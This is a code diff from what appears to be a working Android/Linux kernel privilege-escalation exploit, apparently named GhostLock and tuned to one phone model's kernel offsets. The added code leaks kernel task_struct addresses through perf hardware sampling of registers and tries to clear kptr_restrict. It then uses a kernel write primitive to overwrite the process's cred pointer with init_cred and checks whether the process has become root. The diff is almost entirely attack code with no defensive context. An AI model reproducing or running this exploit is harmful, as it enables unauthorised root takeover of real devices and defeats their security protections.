@@ -20,6 +20,7 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <sys/utsname.h>
+#include <poll.h>
 
 const struct kernel_offsets *active_offsets = NULL;
 
@@ -790,6 +791,22 @@ static void uid0_park_diag(void) {
   read_first_line("/proc/sys/kernel/kptr_restrict", line, sizeof(line));
   snprintf(b, sizeof(b), "kptr_restrict=%s", line);
   diag_line(fd, b);
+  {
+    errno = 0;
+    int kr = open("/proc/sys/kernel/kptr_restrict", O_WRONLY);
+    snprintf(b, sizeof(b), "kptr_wr_open fd=%d errno=%d", kr, errno);
+    diag_line(fd, b);
+    if (kr >= 0) {
+      errno = 0;
+      ssize_t nw = write(kr, "0\n", 2);
+      snprintf(b, sizeof(b), "kptr_wr n=%zd errno=%d", nw, errno);
+      diag_line(fd, b);
+      close(kr);
+      read_first_line("/proc/sys/kernel/kptr_restrict", line, sizeof(line));
+      snprintf(b, sizeof(b), "kptr_restrict_after=%s", line);
+      diag_line(fd, b);
+    }
+  }
   read_first_line("/proc/sys/kernel/dmesg_restrict", line, sizeof(line));
   snprintf(b, sizeof(b), "dmesg_restrict=%s", line);
   diag_line(fd, b);
@@ -853,58 +870,181 @@ static void uid0_park_diag(void) {
     close(fd);
 }
 
-/* perf_find_task - only used when perf is available (shell context) */
-static uintptr_t perf_find_task(void) {
-  struct perf_event_attr pe;
-  memset(&pe, 0, sizeof(pe));
-  pe.type = PERF_TYPE_SOFTWARE;
-  pe.size = sizeof(pe);
-  pe.config = PERF_COUNT_SW_CPU_CLOCK;
-  pe.sample_period = 5000;
-  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
-  pe.sample_regs_intr = (1ULL << 32) - 1;
-  pe.disabled = 1;
-  pe.exclude_user = 1;
-  pe.exclude_hv = 1;
-  pe.exclude_idle = 1;
+/*
+ * Z18: parent and child majority-voted the same P0 VA — a hot shared
+ * kernel object, not task_struct (that VA was only 16-byte aligned).
+ * Collect a histogram, then take set-difference vs the other process.
+ * pid>0 attaches to that tgid (parent must yield; child busy-loops).
+ */
+#define PERF_MAX_CAND 256
+#define PERF_MAX_UNIQ 16
+/* CPH2521 Image kallsyms (kptr hashed on-device; file is unhashed). */
+#define OFF_SYS_GETPID 0x0165d20ULL
+#define LEN_SYS_GETPID 0xC0ULL
+#define OFF_EL0_SVC_COMMON 0x0096728ULL
+#define LEN_EL0_SVC_COMMON 0x270ULL
 
-  errno = 0;
-  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
-  if (fd < 0) {
-    pr_info("perf_event_open failed errno=%d\n", errno);
-    return 0;
+struct perf_leak {
+  uintptr_t best;
+  int best_cnt;
+  int nc;
+  int n_hi;
+  int n_samp;
+  int n_getpid;
+  int n_svc;
+  uintptr_t x0;
+  int x0_cnt;
+  uintptr_t x28;
+  int x28_cnt;
+  uintptr_t uniq[PERF_MAX_UNIQ];
+  int uniq_cnt[PERF_MAX_UNIQ];
+  int nuniq;
+};
+
+/* Park-boot leak_probe: PERF_TYPE_HARDWARE = EOPNOTSUPP (95).
+ * armv8_pmuv3 type=8, inst_retired event=0x8. x28 is per-task, 64-aligned,
+ * 100% stable, parent≠child (not the ffffff80 P0 window — ffffff87/88). */
+static int pmu_type_armv8(void) {
+  int t = 8;
+  FILE *f = fopen("/sys/bus/event_source/devices/armv8_pmuv3/type", "r");
+  if (f) {
+    if (fscanf(f, "%d", &t) != 1)
+      t = 8;
+    fclose(f);
   }
+  return t;
+}
+
+static int task_ptr_ok(uintptr_t v) {
+  if ((v & 0x3f) != 0)
+    return 0;
+  /* Linear + high aliases. Exclude ffffffc0 vmap stacks and ffffffd7 trampolines. */
+  return v >= 0xffffff8000000000ULL && v < 0xffffffc000000000ULL;
+}
+
+static int perf_open_hw(int pid, struct perf_event_attr *pe, const char **mode) {
+  int pmu = pmu_type_armv8();
+  memset(pe, 0, sizeof(*pe));
+  pe->size = sizeof(*pe);
+  pe->disabled = 1;
+  pe->exclude_user = 1;
+  pe->exclude_hv = 1;
+  pe->sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
+  pe->sample_regs_intr = (1ULL << 33) - 1;
+  pe->type = (uint32_t)pmu;
+  pe->config = 0x8; /* inst_retired */
+  pe->sample_period = 2000;
+  errno = 0;
+  int fd = (int)syscall(__NR_perf_event_open, pe, (long)pid, -1, -1, 0);
+  if (fd >= 0) {
+    *mode = "pmu8_inst";
+    return fd;
+  }
+  int e1 = errno;
+  pe->config = 0x11; /* cpu_cycles */
+  errno = 0;
+  fd = (int)syscall(__NR_perf_event_open, pe, (long)pid, -1, -1, 0);
+  if (fd >= 0) {
+    *mode = "pmu8_cyc";
+    return fd;
+  }
+  pr_info("perf pmu type=%d pid=%d inst_errno=%d cyc_errno=%d\n", pmu, pid, e1,
+          errno);
+  *mode = "none";
+  return -1;
+}
+
+static void leak_add(struct perf_leak *out, uintptr_t v) {
+  int found = -1;
+  for (int u = 0; u < out->nuniq; u++) {
+    if (out->uniq[u] == v) {
+      found = u;
+      break;
+    }
+  }
+  if (found >= 0)
+    out->uniq_cnt[found]++;
+  else if (out->nuniq < PERF_MAX_UNIQ) {
+    out->uniq[out->nuniq] = v;
+    out->uniq_cnt[out->nuniq] = 1;
+    out->nuniq++;
+  }
+}
+
+static int perf_collect(int pid, struct perf_leak *out) {
+  memset(out, 0, sizeof(*out));
+  const char *mode = "none";
+  struct perf_event_attr pe;
+  int fd = perf_open_hw(pid, &pe, &mode);
+  if (fd < 0)
+    return -1;
   size_t msz = 4096 * (1 + 32);
   void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
   if (buf == MAP_FAILED) {
-    pr_info("perf mmap failed errno=%d\n", errno);
+    pr_info("perf mmap pid=%d errno=%d\n", pid, errno);
     close(fd);
-    return 0;
+    return -1;
   }
   ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
-  for (volatile int i = 0; i < 500000; i++) syscall(__NR_getpid);
+  if (pid > 0) {
+    for (int i = 0; i < 400; i++) {
+      struct timespec ts = {0, 2000000L};
+      nanosleep(&ts, NULL);
+    }
+  } else {
+    for (volatile int i = 0; i < 800000; i++)
+      syscall(__NR_getpid);
+  }
   ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
+
+  uint64_t getpid_lo = (uint64_t)text_addr(KIMAGE_TEXT_BASE + OFF_SYS_GETPID);
+  uint64_t getpid_hi = getpid_lo + LEN_SYS_GETPID;
+  uint64_t svc_lo = (uint64_t)text_addr(KIMAGE_TEXT_BASE + OFF_EL0_SVC_COMMON);
+  uint64_t svc_hi = svc_lo + LEN_EL0_SVC_COMMON;
+
   struct perf_event_mmap_page *hdr = buf;
   uint64_t head = hdr->data_head;
   __sync_synchronize();
   char *base = (char *)buf + 4096;
   size_t dsz = 4096 * 32;
   uint64_t pos = hdr->data_tail;
-  uintptr_t cands[256]; int nc = 0;
-  int n_hi = 0;
-  while (pos < head && nc < 256) {
+  int n_hi = 0, n_samp = 0, n_ip_log = 0;
+  uintptr_t x28s[PERF_MAX_CAND];
+  int nx28 = 0;
+  while (pos < head) {
     struct perf_event_header *ev = (void *)(base + (pos % dsz));
-    if (ev->size == 0) break;
+    if (ev->size == 0)
+      break;
     if (ev->type == PERF_RECORD_SAMPLE) {
       char *p = (char *)ev + sizeof(*ev);
-      p += 8; /* skip IP */
-      uint64_t abi = *(uint64_t *)p; p += 8;
+      uint64_t ip = *(uint64_t *)p;
+      p += 8;
+      n_samp++;
+      int in_getpid = (ip >= getpid_lo && ip < getpid_hi);
+      int in_svc = (ip >= svc_lo && ip < svc_hi);
+      if (in_getpid)
+        out->n_getpid++;
+      if (in_svc)
+        out->n_svc++;
+      if (n_ip_log < 4) {
+        pr_info("  ip[%d]=%016llx getpid=%d svc=%d\n", n_ip_log,
+                (unsigned long long)ip, in_getpid, in_svc);
+        n_ip_log++;
+      }
+      uint64_t abi = *(uint64_t *)p;
+      p += 8;
       if (abi == 1 || abi == 2) {
         uint64_t *regs = (uint64_t *)p;
-        for (int i = 0; i < 32 && nc < 256; i++) {
+        uint64_t r28 = regs[28];
+        if (task_ptr_ok((uintptr_t)r28) && nx28 < PERF_MAX_CAND)
+          x28s[nx28++] = (uintptr_t)r28;
+        else if (r28 > 0xffffff8000000000ULL && nx28 < PERF_MAX_CAND &&
+                 (r28 & 0x3f) == 0)
+          x28s[nx28++] = (uintptr_t)r28;
+        for (int i = 0; i < 33; i++) {
           uint64_t v = regs[i];
           if (p0_dram_ptr(v))
-            cands[nc++] = v;
+            leak_add(out, (uintptr_t)v);
           else if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL)
             n_hi++;
         }
@@ -912,34 +1052,128 @@ static uintptr_t perf_find_task(void) {
     }
     pos += ev->size;
   }
-  hdr->data_tail = head; munmap(buf, msz); close(fd);
-  if (!nc) {
-    pr_info("perf task: none in P0 DRAM window (hi_alias=%d)\n", n_hi);
-    return 0;
+  hdr->data_tail = head;
+  munmap(buf, msz);
+  close(fd);
+  out->nc = 0;
+  for (int u = 0; u < out->nuniq; u++)
+    out->nc += out->uniq_cnt[u];
+  out->n_hi = n_hi;
+  out->n_samp = n_samp;
+  if (nx28) {
+    uintptr_t bx = 0;
+    int bc = 0;
+    for (int i = 0; i < nx28; i++) {
+      int c = 0;
+      for (int j = 0; j < nx28; j++)
+        if (x28s[j] == x28s[i])
+          c++;
+      if (c > bc) {
+        bc = c;
+        bx = x28s[i];
+      }
+    }
+    out->x28 = bx;
+    out->x28_cnt = bc;
+    out->x0 = bx;
+    out->x0_cnt = bc;
   }
-  uintptr_t best = 0; int best_cnt = 0;
-  for (int i = 0; i < nc; i++) {
-    int cnt = 0;
-    for (int j = 0; j < nc; j++) if (cands[j] == cands[i]) cnt++;
-    if (cnt > best_cnt) { best_cnt = cnt; best = cands[i]; }
+  if (out->nuniq) {
+    int best_i = 0;
+    for (int u = 1; u < out->nuniq; u++)
+      if (out->uniq_cnt[u] > out->uniq_cnt[best_i])
+        best_i = u;
+    out->best = out->uniq[best_i];
+    out->best_cnt = out->uniq_cnt[best_i];
   }
-  pr_info("perf task: 0x%016zx (%d/%d p0 votes, hi_alias=%d)\n",
-          best, best_cnt, nc, n_hi);
+  pr_info("perf pid=%d mode=%s samp=%d x28=%016zx x28n=%d/%d al64=%d\n", pid,
+          mode, n_samp, out->x28, out->x28_cnt, nx28,
+          (out->x28 & 0x3f) == 0);
+  return out->x28_cnt;
+}
+
+static int leak_has(const struct perf_leak *l, uintptr_t v) {
+  for (int i = 0; i < l->nuniq; i++)
+    if (l->uniq[i] == v)
+      return 1;
+  return 0;
+}
+
+/* Highest-count VA in `from` that is not in `other`. Prefer 64-aligned. */
+static uintptr_t leak_unique(const struct perf_leak *from,
+                             const struct perf_leak *other, int want_align,
+                             int *out_cnt) {
+  uintptr_t best = 0;
+  int best_cnt = 0;
+  for (int i = 0; i < from->nuniq; i++) {
+    uintptr_t v = from->uniq[i];
+    int c = from->uniq_cnt[i];
+    if (other && leak_has(other, v))
+      continue;
+    if (want_align && (v & 0x3f))
+      continue;
+    if (c > best_cnt) {
+      best_cnt = c;
+      best = v;
+    }
+  }
+  if (out_cnt)
+    *out_cnt = best_cnt;
   return best;
 }
 
+static uintptr_t perf_find_task_pid(int pid) {
+  struct perf_leak l;
+  if (perf_collect(pid, &l) <= 0)
+    return 0;
+  if (l.best_cnt * 2 < l.nc) {
+    pr_info("perf task weak majority — reject\n");
+    return 0;
+  }
+  return l.best;
+}
+
+static uintptr_t perf_find_task(void) { return perf_find_task_pid(0); }
+
 struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };
+
+static void child_spin_until_cmd(int cmd_r, char *cmd) {
+  struct pollfd pfd;
+  pfd.fd = cmd_r;
+  pfd.events = POLLIN;
+  for (;;) {
+    pfd.revents = 0;
+    if (poll(&pfd, 1, 0) > 0 && (pfd.revents & POLLIN)) {
+      if (read(cmd_r, cmd, 1) == 1)
+        return;
+    }
+    syscall(__NR_getpid);
+  }
+}
 
 static void child_main(struct child_pipes *p) {
   close(p->task_r); close(p->cmd_w); close(p->uid_r);
-  uintptr_t my_task = perf_find_task();
+  prctl(PR_SET_NAME, "gl_uid0_child", 0, 0, 0);
+  {
+    cpu_set_t set;
+    CPU_ZERO(&set);
+    CPU_SET(6, &set);
+    sched_setaffinity(0, sizeof(set), &set);
+  }
+  /* Ready token only — parent HW-samples our getpid loop (Z19 self-sample
+   * was timer-IRQ rb nodes, not task_struct). */
+  uintptr_t my_task = 0;
   write(p->task_w, &my_task, sizeof(my_task));
   close(p->task_w);
-  if (!my_task) _exit(1);
-  char cmd;
-  while (read(p->cmd_r, &cmd, 1) == 1) {
-    if (cmd == 'C') { uint32_t uid = getuid(); write(p->uid_w, &uid, sizeof(uid)); }
-    else if (cmd == 'G') break;
+  char cmd = 0;
+  child_spin_until_cmd(p->cmd_r, &cmd);
+  for (;;) {
+    if (cmd == 'C') {
+      uint32_t uid = getuid();
+      write(p->uid_w, &uid, sizeof(uid));
+    } else if (cmd == 'G')
+      break;
+    child_spin_until_cmd(p->cmd_r, &cmd);
   }
   close(p->cmd_r); close(p->uid_w);
   if (getuid() != 0) _exit(1);
@@ -967,6 +1201,81 @@ static pid_t spawn_child(struct child_pipes *p) {
   return child;
 }
 
+static uint64_t dram_size(void) {
+  FILE *f = fopen("/proc/meminfo", "r");
+  unsigned long kb = 0;
+  char line[80];
+  if (f) {
+    while (fgets(line, sizeof(line), f)) {
+      if (sscanf(line, "MemTotal: %lu kB", &kb) == 1)
+        break;
+    }
+    fclose(f);
+  }
+  uint64_t b = (uint64_t)kb * 1024ULL;
+  uint64_t gb = 1ULL << 30;
+  if (b < gb)
+    return 0x400000000ULL;
+  return ((b + gb - 1) / gb) * gb;
+}
+
+/* 64GB DIRECT_MAP (Z7) aliases past DRAM. Wrap into the real P0 window. */
+static uintptr_t p0_from_direct(uintptr_t v) {
+  uint64_t ram = dram_size();
+  if (v < (uintptr_t)P0_PAGE_OFFSET)
+    return 0;
+  uint64_t off = (uint64_t)v - (uint64_t)P0_PAGE_OFFSET;
+  if (off >= 0x1000000000ULL)
+    return 0;
+  return (uintptr_t)P0_PAGE_OFFSET + (off % ram);
+}
+
+static int read_proc_comm(pid_t pid, char *out, size_t n) {
+  char path[64];
+  snprintf(path, sizeof(path), "/proc/%d/comm", (int)pid);
+  int fd = open(path, O_RDONLY);
+  if (fd < 0)
+    return -1;
+  ssize_t r = read(fd, out, n - 1);
+  close(fd);
+  if (r <= 0)
+    return -1;
+  out[r] = 0;
+  for (ssize_t i = 0; i < r; i++)
+    if (out[i] == '\n') {
+      out[i] = 0;
+      break;
+    }
+  return 0;
+}
+
+static void uid0_w2_overlay(void) {
+  uint64_t it_off = (active_offsets && active_offsets->off_init_task)
+                        ? active_offsets->off_init_task
+                        : 0x027CC000ULL;
+  fake_task = data_addr(KIMAGE_TEXT_BASE + it_off);
+  fake_lock = data_addr(KIMAGE_TEXT_BASE +
+      (active_offsets && active_offsets->off_bss_tail_lock
+           ? active_offsets->off_bss_tail_lock
+           : 0x02BB9D00ULL));
+  page_base = fake_lock;
+  if (!fake_fops)
+    fake_fops = fake_lock;
+  pselect_child_node = 1;
+}
+
+static void uid0_one_store(uintptr_t slot, const char *tag) {
+  uid0_w2_overlay();
+  uintptr_t icred = data_addr(g_init_cred_image);
+  uintptr_t val = g_cred_copy ? g_cred_copy : icred;
+  pr_info("UID0 store %s slot=%016zx val=%016zx\n", tag, slot, val);
+  live_sync_log("UID0", tag);
+  set_pselect_write_mode(slot, 0, 4);
+  run_main_route_threads();
+  clear_pselect_write();
+  fflush(stdout);
+}
+
 /* Same-process W2 after a live Z4 park. Z5 (second GhostLock process) KP'd. */
 static int uid0_cred_walk(void) {
   pr_success("UID0: park live — diag then cred if P0 task leak\n");
@@ -977,15 +1286,6 @@ static int uid0_cred_walk(void) {
   unsetenv("MODE4_SLIDE_ZERO");
   setenv("MODE4_SLIDE_CRED", "1", 1);
 
-  uintptr_t self_task = perf_find_task();
-  {
-    char b[96];
-    snprintf(b, sizeof(b), "self_task=%016zx p0=%d", self_task,
-             p0_dram_ptr(self_task));
-    pr_info("UID0 %s\n", b);
-    live_sync_log("UID0", b);
-  }
-
   struct child_pipes pipes;
   pid_t child = spawn_child(&pipes);
   if (child < 0) {
@@ -994,111 +1294,125 @@ static int uid0_cred_walk(void) {
     return 1;
   }
 
-  uintptr_t child_task = 0;
-  if (read(pipes.task_r, &child_task, sizeof(child_task)) !=
-      (ssize_t)sizeof(child_task))
-    child_task = 0;
+  uintptr_t child_self = 0;
+  if (read(pipes.task_r, &child_self, sizeof(child_self)) !=
+      (ssize_t)sizeof(child_self))
+    child_self = 0;
   close(pipes.task_r);
 
-  if (!p0_dram_ptr(child_task)) {
-    pr_info("UID0: child leak not P0 DRAM — retry once\n");
-    live_sync_log("UID0", "perf_miss_retry");
-    close(pipes.cmd_w);
-    close(pipes.uid_r);
-    waitpid(child, NULL, 0);
-    child = spawn_child(&pipes);
-    if (child < 0) {
-      pr_info("UID0: retry fork failed\n");
-      return 1;
-    }
-    if (read(pipes.task_r, &child_task, sizeof(child_task)) !=
-        (ssize_t)sizeof(child_task))
-      child_task = 0;
-    close(pipes.task_r);
-  }
+  /* Child is now busy-looping getpid. Sample parent, then attach to child. */
+  struct perf_leak lself, lch;
+  memset(&lself, 0, sizeof(lself));
+  memset(&lch, 0, sizeof(lch));
+  perf_collect(0, &lself);
+  perf_collect((int)child, &lch);
 
+  int ucnt = 0;
   uintptr_t use_task = 0;
   const char *who = "none";
-  if (p0_dram_ptr(child_task)) {
-    use_task = child_task;
-    who = "child";
-  } else if (p0_dram_ptr(self_task)) {
-    use_task = self_task;
-    who = "self";
+  /* Z27: parent x28 landed in P0 DRAM (ffffff80…). Prefer that so getuid()
+   * is in-process. Child high-alias cred store lived but getuid never
+   * replied. Z26 comm canary showed x28+0x790 is task.comm. */
+  /* Z28: DRAM-modulo wrap of ffffff89→ffffff81 pre-select KP. Raw high
+   * alias stores live (Z25–Z27). Only use P0 if the sample is already
+   * in the 16GB window. */
+  if (p0_dram_ptr(lself.x28) && lself.x28_cnt >= 8) {
+    use_task = lself.x28;
+    ucnt = lself.x28_cnt;
+    who = "self_x28_p0";
+  } else if (p0_dram_ptr(lch.x28) && lch.x28_cnt >= 8 &&
+             lch.x28 != lself.x28) {
+    use_task = lch.x28;
+    ucnt = lch.x28_cnt;
+    who = "child_x28_p0";
+  } else if (task_ptr_ok(lch.x28) && lch.x28_cnt >= 8 &&
+             lch.x28 != lself.x28) {
+    use_task = lch.x28;
+    ucnt = lch.x28_cnt;
+    who = "child_x28";
+  } else if (task_ptr_ok(lself.x28) && lself.x28_cnt >= 8) {
+    use_task = lself.x28;
+    ucnt = lself.x28_cnt;
+    who = "self_x28";
   }
 
-  if (!use_task) {
-    pr_info("UID0: no P0 DRAM task leak — skip cred, keep park, diag only\n");
-    live_sync_log("UID0", "diag_only_no_p0_task");
+  {
+    char b[280];
+    snprintf(b, sizeof(b),
+             "self_x28=%016zx/%d child_x28=%016zx/%d use=%016zx who=%s ucnt=%d",
+             lself.x28, lself.x28_cnt, lch.x28, lch.x28_cnt, use_task, who,
+             ucnt);
+    pr_info("UID0 %s\n", b);
+    live_sync_log("UID0", b);
+  }
+
+  if (!task_ptr_ok(use_task)) {
+    pr_info("UID0: no unique x28 task — skip cred punch, keep park\n");
+    live_sync_log("UID0", "diag_only_no_x28");
     durable_stage("uid0_diag_only");
     close(pipes.cmd_w);
     close(pipes.uid_r);
-    waitpid(child, NULL, WNOHANG);
+    kill(child, SIGKILL);
+    waitpid(child, NULL, 0);
     return 0;
   }
 
-  uintptr_t cred_slot = use_task + TASK_CRED_OFF;
-  uintptr_t icred = data_addr(g_init_cred_image);
+  uintptr_t wrapped = p0_from_direct(use_task);
   {
     char b[220];
     snprintf(b, sizeof(b),
-             "who=%s pid=%d task=%016zx cred_off=%x slot=%016zx init_cred=%016zx "
-             "copy=%016zx",
-             who, (int)child, use_task, (unsigned)TASK_CRED_OFF, cred_slot,
-             icred, g_cred_copy);
+             "who=%s pid=%d raw=%016zx wrap=%016zx ram=%llx comm_off=%x",
+             who, (int)child, use_task, wrapped, (unsigned long long)dram_size(),
+             (unsigned)TASK_COMM_OFF);
     pr_info("UID0 %s\n", b);
     live_sync_log("UID0", b);
   }
   durable_stage("uid0_w2_enter");
 
   /*
-   * Park is spray-free (BSS lock). cred_copy lives on a sprayed page used
-   * only as VALUE. Overlay lock/task stay init_task BSS so reclaim miss
-   * cannot poison select (Z9–Z13).
+   * Z26: comm canary on RAW x28 changed gl_uid0_child → NUL-prefixed
+   * marker (task_struct). The follow-up cred walk (W3) KP'd at pre-select.
+   * One store only: *task.cred = init_cred (Z25 geometry lived).
    */
-  {
-    uint64_t it_off = (active_offsets && active_offsets->off_init_task)
-                          ? active_offsets->off_init_task
-                          : 0x027CC000ULL;
-    uintptr_t bss_lock = data_addr(KIMAGE_TEXT_BASE + it_off + 0x878ULL);
-    uintptr_t it_p0 = data_addr(KIMAGE_TEXT_BASE + it_off);
-    if (!g_cred_copy) {
-      pr_info("UID0: post-park spray for cred_copy only (overlay stays BSS)\n");
-      live_sync_log("UID0", "cred_copy_spray");
-      setenv("SKIP_DRAIN", "1", 1);
-      setenv("LIGHT_DRAIN", "1", 1);
-      set_pselect_write_mode(use_task + TASK_CRED_OFF, 0, 4);
-      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
-    }
-    fake_lock = bss_lock;
-    fake_task = it_p0;
-  }
-  if (!g_cred_copy) {
-    pr_info("UID0: cred_copy spray missed — skip W2, park stays\n");
-    live_sync_log("UID0", "no_cred_copy");
-    close(pipes.cmd_w);
-    close(pipes.uid_r);
-    waitpid(child, NULL, WNOHANG);
-    return 0;
-  }
-  pr_info("=== UID0 W2 cred (reuse spray) === target=0x%016zx lock=%016zx "
-          "cred_copy=%016zx\n",
-          cred_slot, fake_lock, g_cred_copy);
-  pselect_child_node = 1;
-  set_pselect_write_mode(cred_slot, 0, 4);
-  run_main_route_threads();
-  clear_pselect_write();
+  (void)wrapped;
+  g_cred_copy = 0;
+  uid0_one_store(use_task + TASK_CRED_OFF, "cred");
+  uint32_t self_uid_now = (uint32_t)getuid();
+  pr_info("UID0 getuid_after_store=%u who=%s\n", self_uid_now, who);
+  fflush(stdout);
 
   write(pipes.cmd_w, "C", 1);
   uint32_t child_uid = 9999;
-  if (read(pipes.uid_r, &child_uid, sizeof(child_uid)) !=
-      (ssize_t)sizeof(child_uid))
-    child_uid = 9999;
+  {
+    struct pollfd pfd;
+    pfd.fd = pipes.uid_r;
+    pfd.events = POLLIN;
+    if (poll(&pfd, 1, 2000) > 0 &&
+        read(pipes.uid_r, &child_uid, sizeof(child_uid)) !=
+            (ssize_t)sizeof(child_uid))
+      child_uid = 9999;
+  }
+  uint32_t status_uid = 9999;
+  {
+    char path[64], line[192];
+    snprintf(path, sizeof(path), "/proc/%d/status", (int)child);
+    FILE *sf = fopen(path, "r");
+    if (sf) {
+      while (fgets(line, sizeof(line), sf)) {
+        unsigned u = 9999;
+        if (sscanf(line, "Uid: %u", &u) == 1) {
+          status_uid = u;
+          break;
+        }
+      }
+      fclose(sf);
+    }
+  }
   uint32_t self_uid = (uint32_t)getuid();
   {
-    char b[80];
-    snprintf(b, sizeof(b), "child_uid=%u self_uid=%u who=%s",
-             child_uid, self_uid, who);
+    char b[96];
+    snprintf(b, sizeof(b), "status_uid=%u getuid=%u self_uid=%u who=%s",
+             status_uid, child_uid, self_uid, who);
     pr_info("UID0 %s\n", b);
     live_sync_log("UID0", b);
   }
@@ -1114,7 +1428,7 @@ static int uid0_cred_walk(void) {
     close(pf);
   }
 
-  if (child_uid == 0 || self_uid == 0) {
+  if (child_uid == 0 || self_uid == 0 || status_uid == 0) {
     pr_success("UID0 WIN child is root\n");
     durable_stage("uid0_WIN");
     live_sync_log("UID0", "WIN");
@@ -1129,7 +1443,8 @@ static int uid0_cred_walk(void) {
   durable_stage("uid0_miss");
   close(pipes.cmd_w);
   close(pipes.uid_r);
-  waitpid(child, NULL, WNOHANG);
+  kill(child, SIGKILL);
+  waitpid(child, NULL, 0);
   return 1;
 }
 
